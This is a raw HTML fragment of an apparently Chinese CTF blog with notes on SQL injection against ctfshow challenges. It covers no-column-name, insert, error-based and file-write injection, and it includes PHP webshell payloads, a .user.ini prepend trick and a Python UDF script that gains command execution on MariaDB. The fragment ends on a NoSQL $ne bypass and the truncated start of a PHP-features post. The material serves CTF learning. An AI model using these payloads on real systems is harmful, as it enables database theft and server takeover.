href="#无列名，表名注入（过滤了or-information不可用）" class="headerlink" title="无列名，表名注入（过滤了or,information不可用）"></a>无列名，表名注入（过滤了or,information不可用）</h2><h3 id="查出表名-："><a href="#查出表名-：" class="headerlink" title="查出表名 ："></a>查出表名 ：</h3><h4 id="InnoDb引擎"><a href="#InnoDb引擎" class="headerlink" title="InnoDb引擎"></a>InnoDb引擎</h4><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在<strong>MYSQL5.6以上的版本</strong>中，<strong>inndb增加了innodb_index_stats和innodb_table_stats两张表</strong>，这两张表中都存储了数据库和其数据表的信息，但是<strong>没有存储列名</strong>。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database();-- - <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="sys数据库"><a href="#sys数据库" class="headerlink" title="sys数据库"></a>sys数据库</h4><p>在<strong>5.7以上的MYSQL中</strong>，新增了<strong>sys数据库</strong>，该库的基础数据来自information_schema和performance_schema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名</p><h3 id="查出列名："><a href="#查出列名：" class="headerlink" title="查出列名："></a>查出列名：</h3><p> 无列名注入主要是适用于<strong>已经获取到数据表</strong>，但<strong>无法查询列的情况下</strong>，在大多数 CTF 题目中，<strong>information_schema 库被过滤</strong>，使用这种方法获取列名。 </p><p>无列名注入的原理其实跟给列赋别名有点相似，就是在取别名的同时查询数据。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select &#96;2&#96; from (select 1,2,3 union select * from users)a; #最后a可以为任何字母，但一定要有<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20220821201428955-1662567174497.png" alt="image-20220821201428955"></p><p>查询成功。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a;-- - #或者一样的没区别只是如果没过滤数字可以这样玩select &#96;2&#96; from(select 1,2,3 union select * from flaga limit 1,1)a;-- - (select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- - (select to_base64(&#96;2&#96;) from(select 1,2,3 union select * from flaga limit 1,1)a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p><img src="/images/image-20220824100411927-1662567174498.png" alt="image-20220824100411927"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;# username&#x3D;3&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()));-- A&amp;password&#x3D;1# username&#x3D;3&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;));-- A&amp;password&#x3D;1# username&#x3D;3&#39;,(select flagass23s3 from flag));-- A&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤空格</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;# username&#x3D;3&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())));#&amp;password&#x3D;1# username&#x3D;3&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)));#&amp;password&#x3D;1# username&#x3D;3&#39;,(select(flag)from(flagb)));#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤or</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#username&#x3D;1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1#username&#x3D;1&#39;,(select(&#96;2&#96;)from(select(1,2,3)union(select*from(flagbb)))#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="file注入"><a href="#file注入" class="headerlink" title="file注入"></a>file注入</h2><p>可以看到注入点在<code>filename</code>处，需要使用<code>into outfile</code>的扩展选项。用法如下：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT ... INTO OUTFILE &#39;file_name&#39;        [CHARACTER SET charset_name]        [export_options] export_options:    [&#123;FIELDS | COLUMNS&#125;        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]        [ESCAPED BY &#39;char&#39;]    ]    [LINES        [STARTING BY &#39;string&#39;]        [TERMINATED BY &#39;string&#39;]    ]&#x2F;***********************************************************&#x2F;“OPTION”参数为可选参数选项，其可能的取值有： &#96;FIELDS TERMINATED BY &#39;字符串&#39;&#96;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。 &#96;FIELDS ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。 &#96;FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。 &#96;FIELDS ESCAPED BY &#39;字符&#39;&#96;：设置转义字符，只能为单个字符。默认值为“\”。 &#96;LINES STARTING BY &#39;字符串&#39;&#96;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。 &#96;LINES TERMINATED BY &#39;字符串&#39;&#96;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220824111954659-1662567174498.png" alt="image-20220824111954659"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">filename=1.php' fields terminated by '&lt;?php eval($_REQUEST[1]);?>'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 过滤了php </p><p>先上传.user.ini(其中在每行开头加了<code>;</code>用于注释掉从表ctfshow_user中读出的内容)：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">filename</span><span class="token operator">=</span>.user.ini<span class="token string">' lines starting by '</span><span class="token punctuation">;</span><span class="token string">' terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#//也就是如下语句，只不过在`auto_prepend_file=1.jpg`前后加了%0a用于换行，保证注入的内容单独在一行filename=.user.ini'</span> lines starting by <span class="token string">';'</span> terminated by <span class="token string">"auto_prepend_file=1.jpg"</span>#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>.user.ini的结果类似于：</p><p><img src="https://upload-images.jianshu.io/upload_images/26144645-cee3645dfa319ff0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/505/format/webp" alt="img"></p><p>再上传图片马：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">filename=1.jpg' lines starting by '<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">//查表名</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span>' or <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select <span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token punctuation">.</span>tables <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">-</span> <span class="token class-name">A</span><span class="token comment">//查列名</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span>' or <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select <span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema<span class="token punctuation">.</span>columns <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token lifetime-annotation symbol">'ctfshow_flag</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">-</span> <span class="token class-name">A</span><span class="token comment">//查数据(因为报错信息长度有限，所以要分段读取)</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span>' or <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select <span class="token function">right</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span> from ctfshow_flag limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">-</span> <span class="token class-name">A</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">//查表名</span><span class="token operator">/</span><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token function">extractvalue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">where</span> <span class="token class-name">table_schema</span><span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span> a<span class="token comment">//查列名</span><span class="token operator">/</span><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token function">extractvalue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns <span class="token keyword">where</span> <span class="token class-name">table_name</span><span class="token operator">=</span>'ctfshow_flagsa'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span> a<span class="token comment">//查数据(因为报错信息长度有限，所以要分段读取)</span><span class="token operator">/</span><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token function">extractvalue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">right</span><span class="token punctuation">(</span>flag1<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="floor-函数进行双查询报错"><a href="#floor-函数进行双查询报错" class="headerlink" title="floor() 函数进行双查询报错"></a>floor() 函数进行双查询报错</h3><p> <a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/wzy-ustc/p/14217750.html">https://www.cnblogs.com/wzy-ustc/p/14217750.html</a><br> <a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html</a></p><p>payload如下：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">//查表名</span><span class="token operator">/</span><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">where</span> <span class="token class-name">table_schema</span><span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token operator">--</span> A<span class="token comment">//查列名</span><span class="token operator">/</span><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns <span class="token keyword">where</span> <span class="token class-name">table_name</span><span class="token operator">=</span>'ctfshow_flags' limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token operator">--</span> A<span class="token comment">//查数据</span><span class="token operator">/</span><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag2 <span class="token keyword">from</span> ctfshow_flags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token operator">--</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ceil-amp-round"><a href="#ceil-amp-round" class="headerlink" title="ceil()&amp;round()"></a>ceil()&amp;round()</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span><span class="token comment">//无过滤</span>过滤updatexml extractvalue floor   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用<code>ceil()</code>(向上取整)代替<code>floor()</code>。当然也可以使用<code>round()</code>：<br> ROUND(X) – 表示将值 X 四舍五入为整数，无小数位<br> ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值。<br> payload就不写了，就把上题的<code>floor()</code>换为<code>ceil()</code>或者<code>round()</code>即可，只是最后查数据的时候payload提一下，为：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> `flag<span class="token punctuation">?</span>` <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token operator">--</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个字段名<code>flag?</code>加了反引号，原因是：<br> 表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。   表名、字段名、数据库名等可用反引号 ( &#96; )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错。</p><h2 id="UDF-用户自定义函数"><a href="#UDF-用户自定义函数" class="headerlink" title="UDF 用户自定义函数"></a>UDF 用户自定义函数</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://b4bcd717-3c1a-4396-8822-1fe327002553.challenge.ctf.show/api/?id='</span>code <span class="token operator">=</span> <span class="token stringspan>codes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    codes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token builtin">min</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 建临时表</span>sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''create table temp(data longblob)'''</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''0';&#123;&#125;;-- A'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token comment"># 清空临时表</span>sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''delete from temp'''</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''0';&#123;&#125;;-- A'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token comment"># 插入第一段数据</span>sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''insert into temp(data) values (0x&#123;&#125;)'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>codes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''0';&#123;&#125;;-- A'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token comment"># 更新连接剩余数据</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>codes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''update temp set data = concat(data,0x&#123;&#125;)'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>codes<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''0';&#123;&#125;;-- A'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token comment"># 10.3.18-MariaDB</span><span class="token comment"># 写入so文件</span>sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''select data from temp into dumpfile '/usr/lib/mariadb/plugin/udf.so\'''</span>'payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''0';&#123;&#125;;-- A'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token comment"># 引入自定义函数</span>sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''create function sys_eval returns string soname 'udf.so\'''</span>'payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''0';&#123;&#125;;-- A'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token comment"># 命令执行，结果更新到界面</span>sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''update ctfshow_user set pass=(select sys_eval('cat /flag.her?'))'''</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''0';&#123;&#125;;-- A'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token comment"># 查看结果</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'?page=1&amp;limit=10'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Nosql"><a href="#Nosql" class="headerlink" title="Nosql"></a>Nosql</h2><p> <a href="https://www.modb.pro/db/66192">https://www.modb.pro/db/66192</a> </p><h3 id="1-重言式"><a href="#1-重言式" class="headerlink" title="1) 重言式"></a><strong>1) 重言式</strong></h3><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p><p><img src="/images/image-20220824211523199-1662567174506.png" alt="image-20220824211523199"></p><p>当用户输入</p><p><strong>username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</strong>的时候，程序会将用户输入的账户密码构造成以下数据带入数据库中查询。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span>  <span class="token string single-quoted-string">'uname'</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$ne</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'pwd'</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$ne</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-联合查询"><a href="#2-联合查询" class="headerlink" title="2) 联合查询**"></a>2) 联合查询**</h3><p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p><h3 id="3-JavaScript注入"><a href="#3-JavaScript注入" class="headerlink" title="3) JavaScript注入"></a><strong>3) JavaScript注入</strong></h3><p>这是一种新的漏洞，由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性</title>
      <link href="/2022/09/08/php-te-xing/"/>
      <url>/2022/09/08/php-te-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h2 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token 